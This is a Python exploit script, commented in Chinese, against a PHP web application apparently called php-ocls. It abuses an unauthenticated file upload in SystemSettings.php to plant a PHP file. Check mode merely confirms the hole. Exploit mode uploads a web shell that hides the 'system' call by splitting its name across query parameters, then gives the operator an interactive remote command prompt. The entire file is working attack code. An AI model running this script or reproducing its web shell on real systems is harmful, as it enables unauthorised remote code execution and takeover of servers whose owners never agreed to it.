# python3
import urllib.request
import urllib.parse
import time
from datetime import datetime, timezone
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("url", help="检测路径 例如：http://localhost/php-ocls")
parser.add_argument("-e", "--exp", help="漏洞利用，该选项缺省时为检测漏洞是否存在", action="store_true")
args = parser.parse_args()

poctext = "<?php echo 'success'; ?>"
# ?t=sy&m=st&p=em&rec=whoami
exptext = "<?php if($_GET['check'] == 'check') echo 'success';$t=$_GET['t'];$m=$_GET['m'];$p=$_GET['p'];$rce=$_GET['rce'];$tmp=$t.$m.$p;$tmp($rce); ?>"

# 上传文件，text为上传文件内容
def uploadfile(url, text):
    filename = "keyfile.php"
    filename = str(int(time.time())) + "_" + filename
    # 设置boundary标识符，可自定义
    boundary = "----------boundary"
    # 构建请求数据部分
    data = "--%s\r\n" % boundary
    data += "Content-Disposition: form-data; name='img'; filename='%s'\r\n" % filename
    data += "Content-Type: application/octet-stream\r\n\r\n"
    data += text
    data += "\r\n--%s--\r\n" % boundary
    # 文件上传路径
    req = urllib.request.Request(url + "/classes/SystemSettings.php?f=update_settings", data.encode("utf-8"))
    req.add_header("Content-Type", "multipart/form-data; boundary=%s" % boundary)
    ttmp = []
    # 获取协调世界时的hour
    hour = datetime.now(timezone.utc).hour
    # 计算忽略secound后当前时间的不同时区的时间戳
    for i in range(-12,14):
        ttmp.append(int(datetime.now(timezone.utc).replace(second=0,hour=(hour + i)%24).timestamp()))
    response = urllib.request.urlopen(req)
    # 拼接服务器存储文件可能会用到的文件名
    filenames = [str(i) + "_" + filename for i in ttmp]
    # 判断文件存储到服务器后的url
    for i in filenames:
        hurl = checkfile(url + "/uploads/" + i)
        if hurl != "err" and hurl != "":
            return hurl
    print("利用失败")

# 判断
def checkfile(url):
    try:
        response = urllib.request.urlopen(url  + "?check=check")
        tmp = response.read().decode('utf-8')
        if tmp[0:7] == "success":
            # print("文件存放地址：" + url)
            return url
        return ""
    except (urllib.error.HTTPError) as e:
        return "err"

# 验证漏洞
def poc(url):
    hurl = uploadfile(url, poctext)
    response = urllib.request.urlopen(hurl)
    if response.read().decode('utf-8') == "success":
        print("漏洞存在！")

# 利用漏洞
def exp(url):
    hurl = uploadfile(url, exptext)
    while 1:
        com = input("com:")
        if com == "quit":
            break
        response = urllib.request.urlopen(hurl + "?t=sy&m=st&p=em&rce=" + str(com))
        print(response.read())

if __name__ == "__main__":
    url = args.url
    if args.exp:
        exp(url)
    else:
        poc(url)
